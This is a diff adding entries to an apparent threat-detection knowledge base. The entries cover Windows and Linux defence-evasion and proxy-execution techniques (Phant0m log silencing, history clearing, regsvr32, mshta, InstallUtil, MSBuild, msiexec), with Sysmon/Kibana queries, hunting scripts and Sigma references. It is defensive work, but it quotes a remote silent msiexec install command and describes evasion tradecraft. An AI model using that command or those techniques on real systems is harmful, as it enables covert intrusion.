@@ -219,6 +219,89 @@ Atomic Red Team:
         activity: [
           { cls: "apt-mul", name: "Ransomware", note: "wevtutil cl and PowerShell log clearing routinely run during pre-encryption staging to slow incident response." }
         ],
+              },
+      {
+        sub: "T1070.001 - Event Log Source Silence (Phant0m / EPS gap detection)",
+        os: "win",
+        indicator: "SIEM-side detection: a host that normally emits Security/Sysmon events goes silent while remaining reachable, or the EventLog service is running but producing no events (Phant0m thread-suspension evasion that avoids generating the tell-tale 1102 clear record)",
+        sysmon: `// This detection is SIEM-side, not on-host.
+// The host cannot reliably detect its own silence.
+
+// On-host partial signal: EventLog service is running
+// but zero recent Security events (Phant0m indicator)
+// requires scheduled check from an orchestration tool.
+
+// Sysmon EID 10 (ProcessAccess) targeting the EventLog svchost:
+// Phant0m must open and suspend threads in the service process.
+TargetImage=*\\svchost.exe
+GrantedAccess contains: (0x1F3FFF OR 0x1FFFFF)
+// AND the svchost instance hosts EventLog (correlate via EID 1)`,
+        kibana: `// Source-silence: host stops sending Security events
+// while Sysmon or Heartbeat continues.
+// Build a Kibana Watcher or Lens threshold alert:
+
+// 1. Expected sources that went quiet
+// Metric: count of winlog.channel:"Security" by host.name
+// Condition: drops to 0 for a host that was > 0 in prior window
+
+// 2. Heartbeat confirms host is UP but Security-silent
+agent.type: "heartbeat" AND monitor.status: "up"
+AND host.name: "<target>"
+
+// 3. Phant0m signature: EID 10 access to EventLog svchost
+winlog.event_id: 10
+AND winlog.event_data.TargetImage: *svchost*
+AND winlog.event_data.GrantedAccess: ("0x1F3FFF" OR "0x1FFFFF")`,
+        powershell: `# Check if EventLog service is running but silent (Phant0m tell)
+$svc = Get-Service EventLog
+Write-Host "EventLog service: $($svc.Status)"
+
+$recent = Get-WinEvent -LogName Security -MaxEvents 1 -ErrorAction SilentlyContinue
+if ($recent) {
+  $age = (Get-Date) - $recent.TimeCreated
+  Write-Host "Last Security event: $($age.TotalMinutes) minutes ago"
+  if ($age.TotalMinutes -gt 10) {
+    Write-Host "WARNING: >10min gap - possible Phant0m or service issue"
+  }
+} else {
+  Write-Host "WARNING: No Security events found - possible Phant0m"
+}
+
+# Check for suspended threads in EventLog svchost
+$evtProc = Get-WmiObject Win32_Service -Filter "Name='EventLog'" |
+  Select-Object -ExpandProperty ProcessId
+Write-Host "EventLog PID: $evtProc"
+# Thread suspension requires deeper inspection via debugger/API`,
+        registry: `No registry artifact from Phant0m itself.
+
+The detection is behavioral: the EventLog service is running
+(sc query EventLog shows RUNNING), but no events are being
+written because the service threads are suspended.
+
+Windows Event Forwarding (WEF) is the decisive control:
+events forwarded to a central collector before suspension
+cannot be retracted.`,
+        tools: `SIEM alerting (Elastic Watcher, Splunk, QRadar)
+Heartbeat / uptime monitoring
+Windows Event Forwarding (WEF)
+Microsoft Defender for Endpoint (cloud detection)`,
+        ossdetect: `Sigma:
+- win_security_event_log_service_stopped.yml
+- win_sysmon_process_access_eventlog.yml
+
+Elastic Detection Rules:
+- Windows Event Log Service Stopped
+
+SIEM engineering:
+- Source-silence alert per host (scheduled query)`,
+        notes: "Phant0m is the advanced variant of event log evasion: instead of clearing logs (which writes EID 1102), it suspends the threads of the EventLog service process so no new events are written at all. The service remains in 'Running' state, so sc query and services.msc show no anomaly. The only on-host tell is the EID 10 ProcessAccess event showing the attacker opening the service's svchost with thread-manipulation rights, but that event itself might not be written if Sysmon's logging is also disrupted. The reliable detection is SIEM-side: a host that normally generates Security events going silent while heartbeat/Sysmon traffic continues flowing. This gap-based detection catches Phant0m regardless of implementation variant.",
+        apt: [
+          { cls: "apt-ru", name: "APT29", note: "Advanced anti-forensic tradecraft including event log suppression." },
+          { cls: "apt-cn", name: "APT41", note: "Event log evasion techniques in long-dwell operations." }
+        ],
+        activity: [
+          { cls: "apt-mul", name: "Advanced Operators", note: "Phant0m-style thread suspension requires SYSTEM privileges and signals a sophisticated adversary." }
+        ],
         cite: "MITRE ATT&CK T1070.001"
       }
     ]
@@ -447,6 +530,101 @@ Atomic Red Team:
         ],
         activity: [
           { cls: "apt-mul", name: "Hands-on intruders", note: "Disabling history at session start (unset HISTFILE / set +o history) is near-universal in interactive Linux intrusions." }
+        ],
+              },
+      {
+        sub: "T1070.003 - Session-vs-History Cross-Reference (the absence hunt)",
+        os: "linux",
+        indicator: "A login session visible in wtmp/last with no corresponding shell history entries for that time window, indicating the operator either disabled history before working or cleared it after, the forensic cross-reference that catches all history evasion methods",
+        sysmon: `// Sysmon for Linux cannot directly cross-reference wtmp vs history.
+// This hunt is forensic: compare two independent data sources.
+
+// Supporting signals from Sysmon:
+// EID 1 - interactive shell spawned via sshd
+ParentImage=*/sshd AND Image=(*/bash OR */sh OR */zsh)
+// Cross-ref: did this session produce history entries?
+
+// EID 1 - symlink creation targeting history file
+Image=*/ln AND CommandLine=*/dev/null*bash_history*`,
+        kibana: `// Active SSH sessions (from auth log)
+system.auth.ssh.event: "Accepted"
+
+// Cross-reference with auditd execve events for the same session:
+// If the user logged in but auditd shows no commands, history
+// was disabled or cleared.
+
+// Symlink of history to /dev/null
+process.name: "ln"
+AND process.args: ("/dev/null" AND "*history*")`,
+        powershell: `# Session-vs-history cross-reference
+# Run as root on target Linux hosts
+
+echo "[*] === Recent login sessions (last) ==="
+last -n 20 | grep -v 'reboot\|wtmp'
+
+echo ""
+echo "[*] === History file status per user ==="
+for home in /home/* /root; do
+  user=$(basename "$home")
+  hist="$home/.bash_history"
+  if [ -L "$hist" ]; then
+    target=$(readlink "$hist")
+    echo "  $user: SYMLINK -> $target (SUSPICIOUS if /dev/null)"
+  elif [ -f "$hist" ]; then
+    lines=$(wc -l < "$hist" 2>/dev/null)
+    mtime=$(stat -c '%y' "$hist" 2>/dev/null)
+    echo "  $user: $lines lines, mtime=$mtime"
+  else
+    echo "  $user: NO HISTORY FILE (suspicious if active user)"
+  fi
+done
+
+echo ""
+echo "[*] === Zero-byte or suspiciously small history files ==="
+find /home /root -name '.bash_history' -size 0 2>/dev/null
+find /home /root -name '.bash_history' -size -5c 2>/dev/null
+
+echo ""
+echo "[*] === Auditd commands for sessions without history ==="
+echo "(Compare session PIDs from 'last' against ausearch output)"
+ausearch -m USER_LOGIN -ts recent 2>/dev/null | head -20`,
+        registry: `No registry artifact (Linux technique).
+
+The cross-reference logic:
+1. 'last' or utmpdump shows user X logged in at time T
+2. ~/.bash_history for user X has no entries between T and logout
+3. But auditd (if running) captured commands during that window
+4. Delta between auditd record and history = history was tampered
+
+Key artifacts:
+- /var/log/wtmp (binary, read with 'last' or utmpdump)
+- ~/.bash_history (text, one command per line, timestamps optional)
+- /var/log/audit/audit.log (auditd execve records)`,
+        tools: `osquery:
+  SELECT * FROM last WHERE type=7;  -- user login sessions
+  -- Cross-reference against shell_history table
+
+Velociraptor:
+  Linux.Forensics.BashHistory
+  Linux.Forensics.Timeline
+
+Plaso/log2timeline:
+  Full timeline correlating wtmp + history + auditd`,
+        ossdetect: `osquery scheduled queries:
+- last sessions vs shell_history row count per user
+
+Wazuh:
+- FIM on .bash_history (detect truncation/symlink)
+
+Auditd rules:
+- -w /home -p wa -k bash_history (catch all history writes)`,
+        notes: "The session-vs-history cross-reference is the most powerful history evasion detection because it catches ALL methods (unset HISTFILE, history -c, symlink, kill -9, truncation) with a single logic pattern: 'did this authenticated session leave a proportional history footprint?' A user who logged in for 30 minutes and ran zero commands either did nothing (unlikely) or evaded history (likely). The cross-reference requires two independent data sources (wtmp + history, or wtmp + auditd), which is why auditd is the authoritative control: it captures commands regardless of shell history settings, so the cross-reference always has a ground-truth side.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "History evasion detectable through session cross-reference on compromised Linux servers." },
+          { cls: "apt-cn", name: "Volt Typhoon", note: "Living-off-the-land operators clear history; session cross-reference catches the absence." }
+        ],
+        activity: [
+          { cls: "apt-mul", name: "Hands-on intruders", note: "Any interactive operator who disables history leaves the session-vs-history gap." }
         ],
         cite: "MITRE ATT&CK T1070.003"
       }
@@ -4453,6 +4631,63 @@ Atomic Red Team:
         malware: [
           { cls: "apt-mul", name: "Cobalt Strike", note: "Squiblydoo is a common application-control bypass for fetching and running fileless scriptlet stagers under a signed binary." }
         ],
+              },
+      {
+        sub: "T1218.010 - Regsvr32 Network Egress (remote scriptlet fetch)",
+        os: "win",
+        indicator: "regsvr32.exe making outbound HTTP/HTTPS connections to fetch a remote .sct scriptlet, the network-visible tell that distinguishes Squiblydoo abuse from legitimate COM registration",
+        sysmon: `// Sysmon EID 3 (NetworkConnect) - regsvr32 outbound
+Image=*\\regsvr32.exe
+DestinationPort=(80 OR 443 OR 8080 OR 8443)
+
+// Sysmon EID 22 (DNSQuery) - regsvr32 resolving external
+Image=*\\regsvr32.exe
+QueryName != *.local AND QueryName != *.internal
+
+// Near-zero legitimate regsvr32 network traffic.
+// ANY outbound connection from regsvr32 is high-confidence malicious.`,
+        kibana: `// regsvr32 outbound network connections
+process.name: "regsvr32.exe"
+AND event.category: "network"
+AND destination.port: (80 OR 443 OR 8080)
+
+// DNS resolution by regsvr32
+process.name: "regsvr32.exe"
+AND event.category: "dns"
+AND NOT dns.question.name: *.local`,
+        powershell: `# Hunt for regsvr32 network connections (Sysmon EID 3)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational'; Id=3
+} -MaxEvents 5000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Properties[4].Value -like '*regsvr32*' } |
+  Select-Object TimeCreated,
+    @{n='Dst';e={$_.Properties[14].Value + ':' + $_.Properties[16].Value}}`,
+        registry: `No persistent registry artifact from the network connection itself.
+
+The fetched .sct scriptlet may write to registry as part of its
+payload execution. Check Sysmon EID 12/13 for registry writes
+by scrobj.dll or processes spawned by regsvr32.`,
+        tools: `Sysmon (EID 3 network connect is the key detection)
+Zeek/Suricata (HTTP logs showing regsvr32 User-Agent)
+Proxy logs (regsvr32 fetching .sct from external URL)
+EDR network telemetry`,
+        ossdetect: `Sigma:
+- net_connection_win_regsvr32_network_activity.yml
+
+Elastic Detection Rules:
+- Regsvr32 Network Activity
+
+Sysmon config:
+  EID 3 (NetworkConnect) filtered to regsvr32.exe`,
+        notes: "regsvr32 has near-zero legitimate outbound network traffic. It registers COM DLLs from local paths. Any network connection from regsvr32, especially HTTP/HTTPS to an external IP, is effectively a confirmed Squiblydoo or variant. This network-side detection is more durable than command-line parsing because it catches cases where the /i:URL argument is obfuscated or where the scriptlet URL is constructed dynamically. Deploy Sysmon EID 3 filtered to regsvr32.exe as a standalone high-confidence alert.",
+        apt: [
+          { cls: "apt-ru", name: "APT28", note: "Squiblydoo remote scriptlet fetch documented in operations." },
+          { cls: "apt-cn", name: "APT41", note: "Remote DLL/scriptlet loading through regsvr32 network egress." },
+          { cls: "apt-mul", name: "FIN7", note: "Remote .sct fetch via regsvr32 in maldoc delivery chains." }
+        ],
+        activity: [
+          { cls: "apt-mul", name: "Cobalt Strike Operators", note: "Regsvr32 remote stager fetch is a standard Cobalt Strike delivery pattern." }
+        ],
         cite: "MITRE ATT&CK T1218.010"
       }
     ]
@@ -4650,6 +4885,62 @@ Atomic Red Team:
         malware: [
           { cls: "apt-mul", name: "Kovter / ransomware precursors", note: "mshta launches second-stage payloads from documents, a recurring commodity and pre-ransomware execution pattern." }
         ],
+              },
+      {
+        sub: "T1218.005 - Mshta Child Process and Network Egress",
+        os: "win",
+        indicator: "mshta.exe spawning a shell process (powershell, cmd, wscript, cscript) or making outbound HTTP/HTTPS connections to fetch remote HTA payloads, both strong behavioral indicators of maldoc-chain or inline-script abuse",
+        sysmon: `// Sysmon EID 1 - mshta spawning a shell (the second-stage tell)
+ParentImage=*\\mshta.exe
+Image=(*\\powershell.exe OR *\\cmd.exe OR *\\wscript.exe
+  OR *\\cscript.exe OR *\\rundll32.exe OR *\\regsvr32.exe)
+
+// Sysmon EID 3 - mshta outbound network (remote HTA fetch)
+Image=*\\mshta.exe
+DestinationPort=(80 OR 443 OR 8080 OR 8443)
+
+// Sysmon EID 22 - mshta DNS resolution
+Image=*\\mshta.exe
+QueryName != *.microsoft.com`,
+        kibana: `// mshta child shell processes
+process.parent.name: "mshta.exe"
+AND process.name: ("powershell.exe" OR "cmd.exe" OR "wscript.exe"
+  OR "cscript.exe" OR "rundll32.exe")
+
+// mshta outbound network
+process.name: "mshta.exe"
+AND event.category: "network"
+AND destination.port: (80 OR 443 OR 8080)`,
+        powershell: `# Hunt for mshta child processes (Sysmon EID 1)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational'; Id=1
+} -MaxEvents 10000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Properties[20].Value -like '*mshta*' } |
+  Select-Object TimeCreated,
+    @{n='Child';e={$_.Properties[4].Value}},
+    @{n='CmdLine';e={$_.Properties[10].Value.Substring(0,200)}}`,
+        registry: `No persistent registry artifact from child spawn itself.
+mshta-spawned scripts may write Run keys or scheduled tasks
+as follow-on persistence.`,
+        tools: `Sysmon (EID 1 parent-child + EID 3 network)
+EDR parent-child telemetry
+Proxy logs (mshta User-Agent fetching remote .hta)`,
+        ossdetect: `Sigma:
+- proc_creation_win_mshta_spawn_shell.yml
+- net_connection_win_mshta_network_activity.yml
+
+Elastic Detection Rules:
+- Mshta Making Network Connections
+- Suspicious Mshta Child Process`,
+        notes: "mshta child-process detection catches the second stage: after the HTA/inline script executes, it almost always spawns a shell or LOLBin for the next phase. The parent-child edge mshta->powershell or mshta->cmd is high-confidence malicious with near-zero false positives in enterprise environments. Combining the network egress (remote HTA fetch) with the child spawn (script execution) gives a two-event chain that is essentially proof of the full attack sequence.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Mshta child shell chains documented in tech sector operations." },
+          { cls: "apt-kp", name: "Lazarus", note: "Mshta-to-PowerShell chains in phishing operations." },
+          { cls: "apt-kp", name: "Kimsuky", note: "HTA delivery with shell child processes in targeting campaigns." }
+        ],
+        activity: [
+          { cls: "apt-mul", name: "Phishing Operators", note: "mshta child shells are a hallmark of maldoc-chain phishing." }
+        ],
         cite: "MITRE ATT&CK T1218.005"
       }
     ]
@@ -4844,6 +5135,57 @@ Atomic Red Team:
         ],
         activity: [
           { cls: "apt-mul", name: "Red-team / app-control bypass", note: "InstallUtil /U uninstall-method execution is a standard way to run managed payloads past application control that trusts the .NET directory." }
+        ],
+              },
+      {
+        sub: "T1218.004 - InstallUtil Child Shell and Network Egress",
+        os: "win",
+        indicator: "InstallUtil.exe spawning a shell, making outbound network connections, or loading assemblies that perform runtime compilation (csc.exe/Roslyn), indicating the /U uninstall method is executing attacker code under a trusted .NET binary",
+        sysmon: `// Sysmon EID 1 - InstallUtil child processes
+ParentImage=*\\InstallUtil.exe
+Image=(*\\powershell.exe OR *\\cmd.exe OR *\\rundll32.exe
+  OR *\\csc.exe OR *\\vbc.exe)
+
+// Sysmon EID 3 - InstallUtil network egress
+Image=*\\InstallUtil.exe
+DestinationPort=(80 OR 443 OR 4444 OR 8080 OR 8443)
+
+// Sysmon EID 7 - suspicious image loads by InstallUtil
+Image=*\\InstallUtil.exe
+ImageLoaded=(*\\System.Net.* OR *\\System.Reflection.*)`,
+        kibana: `// InstallUtil child shells or compilers
+process.parent.name: "InstallUtil.exe"
+AND process.name: ("powershell.exe" OR "cmd.exe" OR "csc.exe")
+
+// InstallUtil outbound network
+process.name: "InstallUtil.exe"
+AND event.category: "network"
+AND NOT destination.ip: (10.* OR 172.16.* OR 192.168.*)`,
+        powershell: `# Hunt for InstallUtil spawning children or network
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational'; Id=1
+} -MaxEvents 5000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Properties[20].Value -like '*InstallUtil*' } |
+  Select-Object TimeCreated,
+    @{n='Child';e={$_.Properties[4].Value}},
+    @{n='CmdLine';e={$_.Properties[10].Value.Substring(0,200)}}`,
+        registry: `No persistent registry artifact from the proxy execution itself.`,
+        tools: `Sysmon (EID 1 child + EID 3 network + EID 7 image loads)
+EDR behavioral detection
+Application control (WDAC/AppLocker managed installer rules)`,
+        ossdetect: `Sigma:
+- proc_creation_win_installutil_child_process.yml
+- net_connection_win_installutil_network.yml
+
+Elastic Detection Rules:
+- InstallUtil Network Activity`,
+        notes: "InstallUtil proxy execution is quiet on the command line (just a path to a .dll or .exe with /U), so command-line detection alone is brittle. The behavioral signals (child processes, network egress, runtime compilation) are more reliable because the loaded assembly's actual behavior is what matters, not the InstallUtil invocation itself.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "InstallUtil proxy execution with network callback in documented campaigns." },
+          { cls: "apt-kp", name: "Lazarus", note: "Trusted utility abuse for managed payload execution." }
+        ],
+        malware: [
+          { cls: "apt-mul", name: "Cobalt Strike", note: "Managed-code loaders launched via InstallUtil spawning beacon callbacks." }
         ],
         cite: "MITRE ATT&CK T1218.004"
       }
@@ -5063,6 +5405,65 @@ Atomic Red Team:
         activity: [
           { cls: "apt-mul", name: "Red-team / app-control bypass", note: "MSBuild compiling inline C# from a project file is a standard managed-code execution bypass for trusted-path allow-listing." }
         ],
+              },
+      {
+        sub: "T1127.001 - MSBuild Child Shell and Network Egress",
+        os: "win",
+        indicator: "MSBuild.exe spawning a shell or making outbound network connections after compiling an inline task, or being invoked by a non-developer parent process (Office, script host, explorer), indicating abuse of the trusted build tool for fileless code execution",
+        sysmon: `// Sysmon EID 1 - MSBuild spawning shells or network tools
+ParentImage=*\\MSBuild.exe
+Image=(*\\powershell.exe OR *\\cmd.exe OR *\\rundll32.exe)
+
+// Sysmon EID 1 - MSBuild invoked by non-dev parent
+Image=*\\MSBuild.exe
+ParentImage=(*\\winword.exe OR *\\excel.exe OR *\\outlook.exe
+  OR *\\powershell.exe OR *\\cmd.exe OR *\\explorer.exe
+  OR *\\wscript.exe OR *\\mshta.exe)
+
+// Sysmon EID 3 - MSBuild outbound network
+Image=*\\MSBuild.exe
+DestinationPort=(80 OR 443 OR 4444 OR 8080 OR 8443)`,
+        kibana: `// MSBuild child processes
+process.parent.name: "MSBuild.exe"
+AND process.name: ("powershell.exe" OR "cmd.exe" OR "rundll32.exe")
+
+// MSBuild invoked by non-dev parent (high-confidence)
+process.name: "MSBuild.exe"
+AND process.parent.name: ("winword.exe" OR "excel.exe" OR "outlook.exe"
+  OR "powershell.exe" OR "cmd.exe" OR "explorer.exe")
+
+// MSBuild outbound network
+process.name: "MSBuild.exe"
+AND event.category: "network"
+AND NOT destination.ip: (10.* OR 172.16.* OR 192.168.*)`,
+        powershell: `# Hunt for MSBuild suspicious parents
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational'; Id=1
+} -MaxEvents 5000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Properties[4].Value -like '*MSBuild*' } |
+  Select-Object TimeCreated,
+    @{n='Parent';e={$_.Properties[20].Value}},
+    @{n='CmdLine';e={$_.Properties[10].Value.Substring(0,200)}}`,
+        registry: `No persistent registry artifact from the proxy execution itself.`,
+        tools: `Sysmon (EID 1 parent-child + EID 3 network)
+EDR behavioral detection
+.NET ETW tracing (Assembly.Load events)`,
+        ossdetect: `Sigma:
+- proc_creation_win_msbuild_spawn_shell.yml
+- proc_creation_win_msbuild_susp_parent.yml
+- net_connection_win_msbuild_network.yml
+
+Elastic Detection Rules:
+- MSBuild Making Network Connections
+- Microsoft Build Engine Started by Suspicious Parent`,
+        notes: "MSBuild abuse is distinctive because legitimate MSBuild is invoked by CI/CD pipelines, Visual Studio, and developer scripts, never by Office applications or user shells. The parent-process check (Office/script host parent + MSBuild child) is the highest-confidence single detection. Network egress adds a second behavioral layer: legitimate MSBuild fetches NuGet packages from known registries, not from arbitrary external IPs.",
+        apt: [
+          { cls: "apt-ru", name: "APT29", note: "MSBuild inline task execution under trusted binary in espionage operations." },
+          { cls: "apt-cn", name: "APT41", note: "MSBuild fileless execution in tech sector operations." }
+        ],
+        malware: [
+          { cls: "apt-mul", name: "Cobalt Strike", note: "Inline-task MSBuild projects launching beacon stagers." }
+        ],
         cite: "MITRE ATT&CK T1127.001"
       }
     ]
@@ -5268,6 +5669,79 @@ Atomic Red Team:
         ],
         activity: [
           { cls: "apt-mul", name: "Commodity Malware", note: "Remote MSI installs (msiexec /q /i http) are a common delivery and execution mechanism for first-stage payloads." }
+        ],
+              },
+      {
+        sub: "T1218.007 - Msiexec Network Fetch and Suspicious Custom Actions",
+        os: "win",
+        indicator: "msiexec.exe fetching an MSI package over HTTP/HTTPS (remote /i URL pattern) or spawning shell processes from a custom action within the MSI, indicating malicious installer delivery or payload execution through the Windows Installer service",
+        sysmon: `// Sysmon EID 3 - msiexec outbound network (remote MSI fetch)
+Image=*\\msiexec.exe
+DestinationPort=(80 OR 443 OR 8080)
+
+// Sysmon EID 1 - msiexec spawning shells (custom action payload)
+ParentImage=*\\msiexec.exe
+Image=(*\\powershell.exe OR *\\cmd.exe OR *\\rundll32.exe
+  OR *\\wscript.exe OR *\\cscript.exe)
+
+// The combination is the complete chain:
+// remote fetch + shell spawn = malicious MSI delivery + execution`,
+        kibana: `// msiexec fetching remote MSI
+process.name: "msiexec.exe"
+AND event.category: "network"
+AND destination.port: (80 OR 443 OR 8080)
+
+// msiexec custom action spawning shell
+process.parent.name: "msiexec.exe"
+AND process.name: ("powershell.exe" OR "cmd.exe" OR "rundll32.exe"
+  OR "wscript.exe" OR "cscript.exe")`,
+        powershell: `# Hunt for msiexec network activity and child processes
+Write-Host "[*] === msiexec network connections (EID 3) ==="
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational'; Id=3
+} -MaxEvents 5000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Properties[4].Value -like '*msiexec*' } |
+  Select-Object TimeCreated,
+    @{n='Dst';e={$_.Properties[14].Value + ':' + $_.Properties[16].Value}} |
+  Format-Table -Auto
+
+Write-Host "[*] === msiexec child processes (EID 1) ==="
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational'; Id=1
+} -MaxEvents 5000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Properties[20].Value -like '*msiexec*' } |
+  Select-Object TimeCreated,
+    @{n='Child';e={$_.Properties[4].Value}},
+    @{n='CmdLine';e={$_.Properties[10].Value.Substring(0,150)}}`,
+        registry: `MsiInstaller Application log events:
+- EventID 1033: installation completed
+- EventID 1040: beginning transaction
+- EventID 11707: product installed successfully
+
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer
+  Records installed MSI products. Cross-reference with
+  the network fetch timestamp for forensic correlation.`,
+        tools: `Sysmon (EID 1 child + EID 3 network)
+Windows Installer Application log
+Proxy logs (msiexec fetching remote .msi files)
+EDR behavioral detection`,
+        ossdetect: `Sigma:
+- proc_creation_win_msiexec_spawn_shell.yml
+- net_connection_win_msiexec_remote_install.yml
+
+Elastic Detection Rules:
+- Msiexec Network Connection
+- Suspicious Msiexec Child Process`,
+        notes: "msiexec remote installation (msiexec /q /i http://host/evil.msi) is a clean delivery mechanism because the Windows Installer service handles the download and execution under a Microsoft-signed binary. The /q (quiet) flag suppresses the installer UI, making it silent. Custom actions inside the MSI can run arbitrary code including shell commands, making the child-process detection the second-stage tell. Legitimate software deployment via SCCM/Intune uses msiexec but from managed shares and with known product codes, not from external HTTP URLs.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Remote MSI delivery in documented campaigns." },
+          { cls: "apt-ir", name: "MuddyWater", note: "Msiexec remote payload delivery in Middle East operations." }
+        ],
+        malware: [
+          { cls: "apt-mul", name: "QakBot", note: "MSI-based delivery with custom action payloads." }
+        ],
+        activity: [
+          { cls: "apt-mul", name: "Commodity Malware", note: "Remote MSI installs are a common first-stage delivery mechanism." }
         ],
         cite: "MITRE ATT&CK T1218.007"
       }
